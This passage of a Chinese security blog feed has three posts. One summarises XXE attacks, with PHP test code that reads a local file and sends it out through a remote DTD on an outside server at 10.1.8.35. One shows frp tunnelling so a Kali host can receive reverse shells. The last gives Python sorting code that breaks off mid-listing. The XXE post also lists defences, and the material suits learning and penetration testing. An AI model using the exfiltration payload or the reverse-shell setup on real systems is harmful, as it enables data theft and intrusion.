href="#外部实体支持的协议类型" class="headerlink" title="外部实体支持的协议类型"></a>外部实体支持的协议类型</h2><p>外部实体即在DTD中使用<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 <span class="attr">SYSTEM</span> "<span class="attr">URI</span>"&gt;</span></span><br></pre></td></tr></table></figure></p><p>语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？<br>主要的有file、http、https、ftp等等，不同的程序支持的不一样：</p><table><thead><tr><th style="text-align:left">libxml2</th><th style="text-align:left">PHP</th><th style="text-align:left">JAVA</th><th style="text-align:left">.NET</th></tr></thead><tbody><tr><td style="text-align:left">file</td><td style="text-align:left">file</td><td style="text-align:left">http</td><td style="text-align:left">file</td></tr><tr><td style="text-align:left">http</td><td style="text-align:left">http</td><td style="text-align:left">https</td><td style="text-align:left">http</td></tr><tr><td style="text-align:left">ftp</td><td style="text-align:left">ftp</td><td style="text-align:left">ftp</td><td style="text-align:left">https</td></tr><tr><td style="text-align:left"></td><td style="text-align:left">php</td><td style="text-align:left">file</td><td style="text-align:left">ftp</td></tr><tr><td style="text-align:left"></td><td style="text-align:left">compress.zlib</td><td style="text-align:left">jar</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"></td><td style="text-align:left">compress.bzip2</td><td style="text-align:left">netdoc</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"></td><td style="text-align:left">data</td><td style="text-align:left">mailto</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"></td><td style="text-align:left">glob</td><td style="text-align:left">gopher *</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"></td><td style="text-align:left">phar</td><td style="text-align:left">http</td><td style="text-align:left"></td></tr></tbody></table><h2 id="xxe漏洞利用与防范"><a href="#xxe漏洞利用与防范" class="headerlink" title="xxe漏洞利用与防范"></a>xxe漏洞利用与防范</h2><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>利用方式和上面的演示类似</p><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">'&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">    &lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=C:/Users/dell/Desktop/xxe.txt"&gt;</span></span><br><span class="line"><span class="string">    &lt;!ENTITY % dtd SYSTEM "http://10.1.8.35:8088/Desktop/xxe.dtd"&gt;</span></span><br><span class="line"><span class="string">%dtd;</span></span><br><span class="line"><span class="string">%send;</span></span><br><span class="line"><span class="string">]&gt;'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    $doc = simplexml_load_string($xml,<span class="string">'SimpleXMLElement'</span>,LIBXML_NOENT);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>xxe.dtd内容：<br><img src="/images/xxe漏洞利用总结5.png" alt="/images/xxe漏洞利用总结5.png"><br>为了测试成功，可以使用python开启一个http服务器<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">8088</span></span><br></pre></td></tr></table></figure></p><p>服务器请求log：<br><img src="/images/xxe漏洞利用总结6.png" alt="/images/xxe漏洞利用总结6.png"></p><p><em>注</em>：xxe的利用姿势以及绕过防御姿势有很多，这里不再一一介绍了</p><h3 id="xxe可以用来做什么？"><a href="#xxe可以用来做什么？" class="headerlink" title="xxe可以用来做什么？"></a>xxe可以用来做什么？</h3><p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p><h3 id="防御XXE攻击"><a href="#防御XXE攻击" class="headerlink" title="防御XXE攻击"></a>防御XXE攻击</h3><h4 id="使用开发语言提供的禁用外部实体的方法"><a href="#使用开发语言提供的禁用外部实体的方法" class="headerlink" title="使用开发语言提供的禁用外部实体的方法"></a>使用开发语言提供的禁用外部实体的方法</h4><p>PHP：<br>libxml_disable_entity_loader(true);</p><p>其他语言:<br><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a></p><h4 id="过滤用户提交的XML数据"><a href="#过滤用户提交的XML数据" class="headerlink" title="过滤用户提交的XML数据"></a>过滤用户提交的XML数据</h4><p>关键词：SYSTEM和PUBLIC等。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a></li><li><a href="http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf" target="_blank" rel="noopener">http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf</a></li><li><a href="https://www.youtube.com/watch?v=j2cfebNEfic" target="_blank" rel="noopener">https://www.youtube.com/watch?v=j2cfebNEfic</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;今天很残酷,明天也一样,后天也许还是一样,但你不得不经过明天后天&lt;/blockquote&gt;

&lt;blockquote&gt;
&lt;p&gt;最近遇到了关于xxe相关漏洞，于是想做个总结，方便以后查阅。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="安全" scheme="http://longofo.cc/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xxe" scheme="http://longofo.cc/tags/xxe/"/>
    
  </entry>
  
  <entry>
    <title>frp实现内网穿透-内网kali接收反弹shell</title>
    <link href="http://longofo.cc/frp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F-%E5%86%85%E7%BD%91kali%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%BC%B9shell.html"/>
    <id>http://longofo.cc/frp实现内网穿透-内网kali接收反弹shell.html</id>
    <published>2018-09-08T09:18:00.000Z</published>
    <updated>2018-09-08T11:16:14.400Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">总有一段路，需要一个人走，那就一个人，勇敢的走完</blockquote><p><img src="/images/frp实现内网穿透-内网kali接收反弹shell-1.png" alt=""></p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>公网没有kali主机，且kali处于多层内网，而且不能控制路由器添加端口映射，kali该如何接收反弹式shell?可以使用内网穿透工具，下面使用frp演示.</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul><li>kali机</li><li>外网服务器</li><li><a href="https://github.com/fatedier/frp/releases" target="_blank" rel="noopener">根据自己的操作系统选择frp</a></li></ul><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>服务器配置:<br><img src="/images/frp实现内网穿透-内网kali接收反弹shell-2.png" alt=""><br>服务器运行:<br><img src="/images/frp实现内网穿透-内网kali接收反弹shell-3.png" alt=""></p><p>kali配置:<br><img src="/images/frp实现内网穿透-内网kali接收反弹shell-4.png" alt=""><br>kali运行:<br><img src="/images/frp实现内网穿透-内网kali接收反弹shell-5.png" alt=""></p><p>看服务端控制台输出:<br><img src="/images/frp实现内网穿透-内网kali接收反弹shell-6.png" alt="">kali连接到了服务端，服务端监听了4444端口，这样访问服务端就能访问到kali了。</p><p><strong>注:[kali]的配置type=tcp是因为下面的payload使用的是reverse_tcp</strong><br><strong>注:上面的配置不安全，详细配置请看<a href="https://github.com/fatedier/frp/blob/master/conf/frps_full.ini" target="_blank" rel="noopener">https://github.com/fatedier/frp/blob/master/conf/frps_full.ini</a></strong></p><h2 id="攻击验证frp有效性"><a href="#攻击验证frp有效性" class="headerlink" title="攻击验证frp有效性"></a>攻击验证frp有效性</h2><p>攻击环境:<br><img src="/images/frp实现内网穿透-内网kali接收反弹shell-1.png" alt=""></p><p>kali上运行:<br><img src="/images/frp实现内网穿透-内网kali接收反弹shell-7.png" alt=""><br>监听4444端口</p><p>目标机通过上图红色线反弹shell给kali：<br><img src="/images/frp实现内网穿透-内网kali接收反弹shell-8.png" alt=""><br><img src="/images/frp实现内网穿透-内网kali接收反弹shell-9.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;总有一段路，需要一个人走，那就一个人，勇敢的走完&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/images/frp实现内网穿透-内网kali接收反弹shell-1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://longofo.cc/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="内网穿透" scheme="http://longofo.cc/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>python实现八大排序</title>
    <link href="http://longofo.cc/python%E5%AE%9E%E7%8E%B0%E5%85%AB%E5%A4%A7%E6%8E%92%E5%BA%8F.html"/>
    <id>http://longofo.cc/python实现八大排序.html</id>
    <published>2018-07-09T11:49:52.000Z</published>
    <updated>2018-07-11T03:09:51.669Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">世界这么大,该往哪走?</blockquote><blockquote><p>python实现八大排序</p></blockquote><a id="more"></a><h2 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h2><p>算法基本思想:</p><ul><li>直接插入排序(Straight Insertion Sort)的基本思想是：把n个待排序的元素看成为一个有序表和一个无序表。开始时有序表中只包含1个元素，无序表中包含有n-1个元素，排序过程中每次从无序表中取出第一个元素，将它插入到有序表中的适当位置，使之成为新的有序表，重复n-1次可完成排序过程。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert_sort</span><span class="params">(iterable, reverse=False)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    对可迭代对象进行插入排序</span></span><br><span class="line"><span class="string">    args:</span></span><br><span class="line"><span class="string">        iterable: 可迭代对象</span></span><br><span class="line"><span class="string">        reversed: False默认从小到大排序。True从大到小</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">for</span> i, _ <span class="keyword">in</span> enumerate(iterable):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span> iterable[j] &lt; iterable[j - <span class="number">1</span>]:</span><br><span class="line">                iterable[j], iterable[j - <span class="number">1</span>] = iterable[j - <span class="number">1</span>], iterable[j]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> reverse:</span><br><span class="line">        iterable.reverse()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lst1 = [<span class="number">3</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">100</span>]</span><br><span class="line">    lst2 = [<span class="number">1</span>]</span><br><span class="line">    lst3 = []</span><br><span class="line">    lst4 = lst1[::]</span><br><span class="line">    insert_sort(lst1)</span><br><span class="line">    print(lst1)</span><br><span class="line"></span><br><span class="line">    insert_sort(lst2)</span><br><span class="line">    print(lst2)</span><br><span class="line"></span><br><span class="line">    insert_sort(lst3)</span><br><span class="line">    print(lst3)</span><br><span class="line"></span><br><span class="line">    insert_sort(lst4, reverse=<span class="keyword">True</span>)</span><br><span class="line">    print(lst4)</span><br></pre></td></tr></table></figure><h2 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h2><p>算法基本思想:</p><ul><li>　希尔排序是把记录按下标的一定增量分组，对每组使用直接插入排序算法排序；随着增量逐渐减少，每组包含的关键词越来越多，当增量减至1时，整个文件恰被分成一组，算法便终止。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">ddef shell_insert(iterable, start, end, step):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(start, end, step):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i, start, -step):</span><br><span class="line">            <span class="keyword">if</span> iterable[j] &lt; iterable[j - step]:</span><br><span class="line">                iterable[j], iterable[j -</span><br><span class="line">                                      step] = iterable[j - step], iterable[j]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell_sort</span><span class="params">(iterable, reverse=False)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    对可迭代对象进行希尔排序</span></span><br><span class="line"><span class="string">    args:</span></span><br><span class="line"><span class="string">        iterable: 可迭代对象</span></span><br><span class="line"><span class="string">        reversed: False默认从小到大排序。True从大到小</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    length = len(iterable)</span><br><span class="line">    gap = length // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> gap != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> start <span class="keyword">in</span> range(gap + <span class="number">1</span>):</span><br><span class="line">            shell_insert(iterable, start, length, gap)</span><br><span class="line">        gap = gap // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> reverse:</span><br><span class="line">        iterable.reverse()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lst1 = [<span class="number">3</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">100</span>]</span><br><span class="line">    lst2 = [<span class="number">1</span>]</span><br><span class="line">    lst3 = []</span><br><span class="line">    lst4 = lst1[::]</span><br><span class="line">    shell_sort(lst1)</span><br><span class="line">    print(lst1)</span><br><span class="line"></span><br><span class="line">    shell_sort(lst2)</span><br><span class="line">    print(lst2)</span><br><span class="line"></span><br><span class="line">    shell_sort(lst3)</span><br><span class="line">    print(lst3)</span><br><span class="line"></span><br><span class="line">    shell_sort(lst4, reverse=<span class="keyword">True</span>)</span><br><span class="line">    print(lst4)</span><br></pre></td></tr></table></figure><h2 id="直接选择排序"><a href="#直接选择排序" class="headerlink" title="直接选择排序"></a>直接选择排序</h2><p>算法基本思想:</p><ul><li>与直接插入排序一样，分为有序区和无序区，所不同的是直接播放排序是将无序区的第一个元素直接插入到有序区以形成一个更大的有序区，而直接选择排序是从无序区选一个最小的元素直接放到有序区的最后。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_sort</span><span class="params">(iterable, reverse=False)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    对可迭代对象进行直接选择排序</span></span><br><span class="line"><span class="string">    args:</span></span><br><span class="line"><span class="string">        iterable: 可迭代对象</span></span><br><span class="line"><span class="string">        reversed: False默认从小到大排序。True从大到小</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    length = len(iterable)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">        min_x = iterable[i]</span><br><span class="line">        flag_x = i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>, length):</span><br><span class="line">            <span class="keyword">if</span> iterable[j] &lt; min_x:</span><br><span class="line">                min_x = iterable[j]</span><br><span class="line">                flag_x = j</span><br><span class="line"></span><br><span class="line">        iterable[i], iterable[flag_x] = iterable[flag_x], iterable[i]</span><br><span class="line">        print(iterable)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> reverse:</span><br><span class="line">        iterable.reverse()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lst1 = [<span class="number">3</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">100</span>]</span><br><span class="line">    lst2 = [<span class="number">1</span>]</span><br><span class="line">    lst3 = []</span><br><span class="line">    lst4 = lst1[::]</span><br><span class="line">    select_sort(lst1)</span><br><span class="line">    print(lst1)</span><br><span class="line"></span><br><span class="line">    select_sort(lst2)</span><br><span class="line">    print(lst2)</span><br><span class="line"></span><br><span class="line">    select_sort(lst3)</span><br><span class="line">    print(lst3)</span><br><span class="line"></span><br><span class="line">    select_sort(lst4, reverse=<span class="keyword">True</span>)</span><br><span class="line">    print(lst4)</span><br></pre></td></tr></table></figure><h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><p>算法基本思想(大顶堆为例):</p><ul><li>先将初始排列关键字序列(R1,R2…,Rn-1,Rn)构成大顶堆，此堆为初始的无序区.(这里是从最后一个非叶结点向前进行赛选)</li><li>将堆顶元素R1与最后一个元素Rn交换，此时得到新的无序区(R1,R2…,Rn-1)和新的有序区(Rn)，并且Rn大于无序区所有数，此后还有n-1个数；</li><li>由于交换后新的堆顶R1可能违反堆的性质，因此需要对当前无序区(R1,R2…,Rn-1)调整为新堆(将堆顶元素向下调整使其保持大顶堆的性质，输出堆顶元素)，此后还剩余n-2个数；</li><li>重读以上算法，直到堆中仅剩一个元素为止.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeapSort</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    堆排序</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    set() 方法设置可迭代对象以及排列顺序</span></span><br><span class="line"><span class="string">    _sift_down() 进行向下调整堆</span></span><br><span class="line"><span class="string">    _create_heap() 创建初始堆</span></span><br><span class="line"><span class="string">    heap_sort() 进行堆排序</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(self, iterable, reverse=False)</span>:</span></span><br><span class="line">        self.iterable = iterable</span><br><span class="line">        self.reverse = reverse</span><br><span class="line">        self.length = len(iterable)</span><br><span class="line"></span><br><span class="line">        self.iterable.insert(<span class="number">0</span>, <span class="keyword">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_sift_down</span><span class="params">(self, index)</span>:</span></span><br><span class="line">        left_child, right_child = index * <span class="number">2</span>, index * <span class="number">2</span> + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> left_child &gt; self.cur_len:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        max_child = left_child</span><br><span class="line">        <span class="keyword">if</span> (right_child &lt;= self.cur_len) <span class="keyword">and</span> (self.iterable[left_child] &lt; self.iterable[right_child]):</span><br><span class="line">            max_child = right_child</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.iterable[index] &lt; self.iterable[max_child]:</span><br><span class="line">            self.iterable[index], self.iterable[max_child] = self.iterable[max_child], self.iterable[index]</span><br><span class="line">            self._sift_down(max_child)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_create_heap</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.length // <span class="number">2</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">            self._sift_down(i)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">heap_sort</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># cur_len表示还没有顺序区域的长度</span></span><br><span class="line">        self.cur_len = self.length</span><br><span class="line">        self._create_heap()</span><br><span class="line">        <span class="keyword">while</span> self.cur_len:</span><br><span class="line">            <span class="comment"># print(self.iterable)</span></span><br><span class="line">            self.iterable[<span class="number">1</span>], self.iterable[self.cur_len] = self.iterable[self.cur_len], self.iterable[<span class="number">1</span>]</span><br><span class="line">            self.cur_len -= <span class="number">1</span></span><br><span class="line">            self._sift_down(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.iterable.pop(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> self.reverse:</span><br><span class="line">            self.iterable.reverse()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lst1 = [<span class="number">3</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">100</span>]</span><br><span class="line">    lst2 = [<span class="number">1</span>]</span><br><span class="line">    lst3 = []</span><br><span class="line">    lst4 = lst1[::]</span><br><span class="line"></span><br><span class="line">    heap_sort = HeapSort()</span><br><span class="line"></span><br><span class="line">    heap_sort.set(lst1)</span><br><span class="line">    heap_sort.heap_sort()</span><br><span class="line">    print(lst1)</span><br><span class="line"></span><br><span class="line">    heap_sort.set(lst2)</span><br><span class="line">    heap_sort.heap_sort()</span><br><span class="line">    print(lst2)</span><br><span class="line"></span><br><span class="line">    heap_sort.set(lst3)</span><br><span class="line">    heap_sort.heap_sort()</span><br><span class="line">    print(lst3)</span><br><span class="line"></span><br><span class="line">    heap_sort.set(lst4, reverse=<span class="keyword">True</span>)</span><br><span class="line">    heap_sort.heap_sort()</span><br><span class="line">    print(lst4)</span><br></pre></td></tr></table></figure><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><p>算法基本思想:</p><ul><li>从无序序列头部开始，进行两两比较，根据大小交换位置，直到最后将最大（小）的数据元素交换到了无序队列的队尾，从而成为有序序列的一部分；下一次继续这个过程，直到所有数据元素都排好序。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubble_sort</span><span class="params">(iterable, reverse=False)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    冒泡排序</span></span><br><span class="line"><span class="string">    args:</span></span><br><span class="line"><span class="string">        iterable: 可迭代对象</span></span><br><span class="line"><span class="string">        reversed: False默认从小到大排序。True从大到小</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    length = len(iterable)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">        <span class="comment"># flag标记本次是否交换了数据,如果没交换数据就不用继续排了</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> iterable[j] &gt; iterable[j + <span class="number">1</span>]:</span><br><span class="line">                iterable[j], iterable[j + <span class="number">1</span>] = iterable[j + <span class="number">1</span>], iterable[j]</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> reverse:</span><br><span class="line">        iterable.reverse()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lst1 = [<span class="number">3</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span 